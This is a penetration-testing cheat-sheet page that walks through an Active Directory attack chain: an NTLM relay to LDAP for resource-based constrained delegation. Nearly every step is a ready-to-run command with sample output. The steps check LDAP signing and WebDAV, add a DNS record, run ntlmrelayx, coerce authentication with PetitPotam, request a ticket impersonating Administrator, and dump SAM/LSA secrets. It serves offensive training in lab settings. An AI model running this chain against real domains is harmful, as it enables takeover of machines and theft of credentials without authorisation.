---
title: "LDAP Relay"
tags: ["Active Directory", "LDAP Relay", "Attack Chain", "Impacket", "LDAP", "NTLM", "NTLM Replay", "Pass-The-Hash", "Petitpotam", "RBCD", "Secrets Dump", "Ticket Granting Ticket", "WebDAV", "Windows"]
---

{{< filter_buttons >}}

### LDAP Relay to RBCD

#### 1. Check LDAP Signing

```console {class="password"}
# Password
nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M ldap-checker
```

```console {class="sample-code"}
$ nxc ldap WS01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -M ldap-checker
LDAP        10.10.72.181    389    WS01          [*] Windows Server 2022 Build 20348 (name:WS01) (domain:example.com)
LDAP        10.10.72.181    389    WS01          [+] example.com\apple.seed:Password123!
LDAP-CHE... 10.10.72.181    389    WS01          LDAP signing NOT enforced
LDAP-CHE... 10.10.72.181    389    WS01          LDAPS channel binding is set to: Never
```

```console {class="ntlm"}
# NTLM
nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M ldap-checker
```

```console {class="sample-code"}
$ nxc ldap dc01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d giveback.htb -M ldap-checker
LDAP        10.10.72.181    389    WS01          [*] Windows Server 2022 Build 20348 (name:WS01) (domain:example.com)
LDAP        10.10.72.181    389    WS01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
LDAP-CHE... 10.10.72.181    389    WS01          LDAP signing NOT enforced
LDAP-CHE... 10.10.72.181    389    WS01          LDAPS channel binding is set to: Never
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M ldap-checker
```

```console {class="sample-code"}
$ nxc ldap dc01.example.com -u 'apple.seed' -p 'Password123!' -d giveback.htb -k --kdcHost dc01.example.com -M ldap-checker
LDAP        10.10.72.181    389    WS01          [*] Windows Server 2022 Build 20348 (name:WS01) (domain:example.com)
LDAP        10.10.72.181    389    WS01          [+] example.com\apple.seed:Password123!
LDAP-CHE... 10.10.72.181    389    WS01          LDAP signing NOT enforced
LDAP-CHE... 10.10.72.181    389    WS01          LDAPS channel binding is set to: Never
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M ldap-checker
```

```console {class="sample-code"}
$ nxc ldap dc01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d giveback.htb -k --kdcHost dc01.example.com -M ldap-checker
LDAP        10.10.72.181    389    WS01          [*] Windows Server 2022 Build 20348 (name:WS01) (domain:example.com)
LDAP        10.10.72.181    389    WS01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
LDAP-CHE... 10.10.72.181    389    WS01          LDAP signing NOT enforced
LDAP-CHE... 10.10.72.181    389    WS01          LDAPS channel binding is set to: Never
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc ldap <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M ldap-checker
```

```console {class="sample-code"}
$ nxc ldap dc01.example.com -u 'apple.seed' -d giveback.htb -k --use-kcache --kdcHost dc01.example.com -M ldap-checker
LDAP        10.10.72.181    389    WS01          [*] Windows Server 2022 Build 20348 (name:WS01) (domain:example.com)
LDAP-CHE... 10.10.72.181    389    WS01          LDAP signing NOT enforced
LDAP-CHE... 10.10.72.181    389    WS01          LDAPS channel binding is set to: Never
```

#### 2. Check WebDAV Status

```console {class="password"}
# Password
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M webdav
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -M webdav
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!
WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102
```

```console {class="ntlm"}
# NTLM
nxc smb <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M webdav
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d example.com -M webdav
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!
WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M webdav
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -k --kdcHost dc01.example.com -M webdav
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!
WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc smb <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M webdav
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d example.com -k --kdcHost dc01.example.com -M webdav
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!
WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc smb <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M webdav
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -d example.com -k --use-kcache --kdcHost dc01.example.com -M webdav
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!
WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102
```

#### 3. Add a DNS Entry in Trusted Zone

```console {class="password"}
# Password
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'example.com\apple.seed' -p 'Password123!' --action add --record test.example.com --data 10.10.14.31 10.10.143.102
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

```console {class="ntlm"}
# NTLM
python3 dnstool.py -u '<DOMAIN>\<USER>' -p ':<HASH>' --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'example.com\apple.seed' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' --action add --record test.example.com --data 10.10.14.31 10.10.143.102
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -k --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'example.com\apple.seed' -p 'Password123!' -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
python3 dnstool.py -u '<DOMAIN>\<USER>' -p ':<HASH>' -k --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'example.com\apple.seed' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
python3 dnstool.py -u '<DOMAIN>\<USER>' -k --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'example.com\apple.seed' -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

<small>*Ref: [dnstool.py](https://github.com/dirkjanm/krbrelayx)*</small>

#### 4. Start a Relay Server

```console
impacket-ntlmrelayx -t ldap://<DC> -smb2support --delegate-access
```

```console {class="sample-code"}
$ impacket-ntlmrelayx -t ldap://dc01.example.com -smb2support --delegate-access
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /test/pipe/srvsvc
[*] HTTPD(80): Connection from 10.10.143.102 controlled, attacking target ldap://DC01.example.com
[*] HTTPD(80): Authenticating against ldap://DC01.example.com as INTERCEPT/WS01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] Attempting to create computer in: CN=Computers,DC=intercept,DC=vl
[*] Adding new computer with username: MPAGJQVC$ and password: P8ROIzCA9Wz}9<v result: OK
[*] Delegation rights modified succesfully!
[*] MPAGJQVC$ can now impersonate users on WS01$ via S4U2Proxy
[*] Delegate attack already performed for this computer, skipping
```

#### 5. Coerce Authentication

```console {class="password"}
# Password
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!
COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="ntlm"}
# NTLM
nxc smb <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -k --kdcHost dc01.example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!
COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc smb <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d example.com -k --kdcHost dc01.example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc smb <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -d example.com -k --use-kcache --kdcHost dc01.example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

#### 6. Request a Service Ticket

```console {class="password"}
# Password
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<NEW_COMPUTER>$:<NEW_PASSWORD>' -dc-ip <DC_IP> -spn '<SPN>' -impersonate 'Administrator'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.example.com && impacket-getST 'example.com/EvilComputer$:Password123!' -dc-ip 10.10.143.102 -spn 'cifs/ws01.example.com' -impersonate 'Administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.example.com@example.com.ccache
```

```console {class="ntlm"}
# NTLM
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<NEW_COMPUTER>$' -hashes :<NEW_HASH> -dc-ip <DC_IP> -spn '<SPN>' -impersonate 'Administrator'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.example.com && impacket-getST 'example.com/EvilComputer$' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.143.102 -spn 'cifs/ws01.example.com' -impersonate 'Administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.example.com@example.com.ccache
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<NEW_COMPUTER>$:<NEW_PASSWORD>' -k -dc-ip <DC_IP> -spn '<SPN>' -impersonate 'Administrator'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.example.com && impacket-getST 'example.com/EvilComputer$:Password123!' -k -dc-ip 10.10.143.102 -spn 'cifs/ws01.example.com' -impersonate 'Administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.example.com@example.com.ccache
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<NEW_COMPUTER>$' -hashes :<NEW_HASH> -k -dc-ip <DC_IP> -spn '<SPN>' -impersonate 'Administrator'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.example.com && impacket-getST 'example.com/EvilComputer$' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.143.102 -spn 'cifs/ws01.example.com' -impersonate 'Administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.example.com@example.com.ccache
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<NEW_COMPUTER>$' -k -no-pass -dc-ip <DC_IP> -spn '<SPN>' -impersonate 'Administrator'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.example.com && impacket-getST 'example.com/EvilComputer$' -k -no-pass -dc-ip 10.10.143.102 -spn 'cifs/ws01.example.com' -impersonate 'Administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.example.com@example.com.ccache
```

#### 7. Secrets Dump

``` console
# Pass-the-ticket
export KRB5CCNAME='<CCACHE>'
```

```console {class="sample-code"}
export KRB5CCNAME='Administrator@cifs_WS01.example.com@example.com.ccache'
```

```console
# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && nxc smb <TARGET> -u 'Administrator' -k --use-kcache --sam --lsa
```